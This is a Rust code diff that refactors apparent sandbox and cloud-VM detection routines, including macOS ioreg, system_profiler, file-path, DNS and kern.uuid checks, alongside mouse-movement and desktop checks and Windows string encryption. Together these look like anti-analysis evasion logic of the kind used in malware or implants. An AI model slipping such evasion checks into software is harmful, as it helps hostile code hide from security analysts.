@@ -1,5 +1,5 @@
 use anyhow::Result;
-use log::{info, warn};
+use tracing::{info, warn};
 #[cfg(windows)]
 use string_crypt::enc_str;
 
@@ -126,24 +126,7 @@ pub fn check_mouse_movement() -> u8 {
 /// that case we log a warning once and return 0 (neutral).
 #[cfg(target_os = "macos")]
 pub fn check_mouse_movement() -> u8 {
-    #[repr(C)]
-    struct CGPoint {
-        x: f64,
-        y: f64,
-    }
-
-    type CGEventRef = *const std::ffi::c_void;
-
-    #[link(name = "ApplicationServices", kind = "framework")]
-    extern "C" {
-        fn CGEventCreate(source: *const std::ffi::c_void) -> CGEventRef;
-        fn CGEventGetLocation(event: CGEventRef) -> CGPoint;
-    }
-
-    #[link(name = "CoreFoundation", kind = "framework")]
-    extern "C" {
-        fn CFRelease(cf: *const std::ffi::c_void);
-    }
+    use crate::macos_ffi::{CGPoint, CGEventRef, CGEventCreate, CGEventGetLocation, CFRelease};
 
     static WARN_ONCE: std::sync::Once = std::sync::Once::new();
     let mut successful_samples = 0usize;
@@ -391,7 +374,7 @@ pub fn check_desktop_windows() -> u8 {
                     }
                 }
                 Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
-                    log::trace!(
+                    tracing::trace!(
                         "env_check_sandbox: skipping '{}' due to EACCES",
                         env_path.display()
                     );
@@ -711,13 +694,101 @@ fn is_cloud_instance_sandbox() -> bool {
 
     #[cfg(target_os = "macos")]
     {
-        let output = std::process::Command::new("sysctl")
-            .args(["-n", "kern.hv_vmm_present"])
+        // Check for Apple paravirtualised I/O via ioreg — this is present in
+        // EC2 Mac instances but NOT in local VMware/Parallels VMs.  We avoid
+        // kern.hv_vmm_present because it fires on ALL macOS VMs (cloud AND
+        // local), which would cause false positives for analyst VMs.
+        // This mirrors the logic in is_expected_hypervisor().
+        if let Ok(output) = std::process::Command::new("ioreg")
+            .args(["-l"])
             .output()
-            .ok();
-        if let Some(o) = output {
-            if String::from_utf8_lossy(&o.stdout).trim() == "1" {
+        {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            if stdout.contains("applevirtio") {
                 return true;
+            }
+        }
+
+        // Check hardware model via system_profiler — EC2 Mac instances report
+        // "EC2" in the hardware model string.
+        if let Ok(out) = std::process::Command::new("system_profiler")
+            .args(["SPHardwareDataType"])
+            .output()
+        {
+            let stdout = String::from_utf8_lossy(&out.stdout).to_ascii_lowercase();
+            if stdout.contains("ec2") {
+                return true;
+            }
+        }
+
+        // ── File-based cloud detection ──────────────────────────────────
+        // AWS EC2 Mac instances install the SSM agent and EC2 launch
+        // helpers under /opt/aws/.  These paths are absent on physical Macs
+        // and on local VMware/Parallels VMs, making them reliable cloud
+        // indicators that do not depend on network probes.
+        if std::path::Path::new("/opt/aws/bin").exists()
+            || std::path::Path::new("/opt/aws/ena").exists()
+        {
+            return true;
+        }
+
+        // ── DNS-based cloud detection ───────────────────────────────────
+        // macOS cannot safely probe 169.254.169.254 (IMDS) due to link-local
+        // interference with mDNS / captive-portal detection.  Instead, we
+        // resolve well-known cloud metadata DNS names.  Successful resolution
+        // indicates the host is running inside the corresponding cloud
+        // provider's network.  This is purely a DNS lookup — no HTTP request
+        // is made, so there is no risk of captive-portal false positives.
+        //
+        // GCP: metadata.google.internal resolves only inside GCP.
+        // Azure: metadata.azure.com is resolvable externally but returns a
+        //   cloud-specific CNAME; we rely on the combination of DNS success
+        //   with a running VM context (checked by kern.hv_vmm_present below).
+        {
+            #[cfg(target_os = "macos")]
+            fn dns_name_resolves(hostname: &str) -> bool {
+                use std::net::ToSocketAddrs;
+                // Append a dummy port for ToSocketAddrs; we only care whether
+                // the name resolves, not the actual address.
+                let addr = format!("{}:0", hostname);
+                addr.to_socket_addrs().is_ok()
+                    && addr.to_socket_addrs().map(|it| !it.is_empty()).unwrap_or(false)
+            }
+
+            // GCP Mac instances (if/when available): metadata.google.internal
+            // only resolves inside Google Cloud.
+            if dns_name_resolves("metadata.google.internal") {
+                return true;
+            }
+
+            // Oracle Cloud (OCI): instance-metadata.oraclecloud.com resolves
+            // inside OCI compartments.
+            if dns_name_resolves("instance-metadata.oraclecloud.com") {
+                return true;
+            }
+        }
+
+        // ── sysctl-based cloud UUID detection ───────────────────────────
+        // Some cloud providers set kern.uuid to a distinctive value.
+        // EC2 Mac instances typically have a UUID that starts with "EC2" or
+        // contains "amazon".  Combined with the VM flag from kern.hv_vmm_present
+        // this provides additional signal without the link-local IMDS risk.
+        if let Ok(output) = std::process::Command::new("sysctl")
+            .args(["-n", "kern.uuid"])
+            .output()
+        {
+            let uuid = String::from_utf8_lossy(&output.stdout).to_ascii_lowercase();
+            if uuid.contains("ec2") || uuid.contains("amazon") {
+                // Verify we are actually in a VM — UUID alone could be spoofed.
+                if let Ok(hv) = std::process::Command::new("sysctl")
+                    .args(["-n", "kern.hv_vmm_present"])
+                    .output()
+                {
+                    let hv_val = String::from_utf8_lossy(&hv.stdout);
+                    if hv_val.trim() == "1" {
+                        return true;
+                    }
+                }
             }
         }
     }
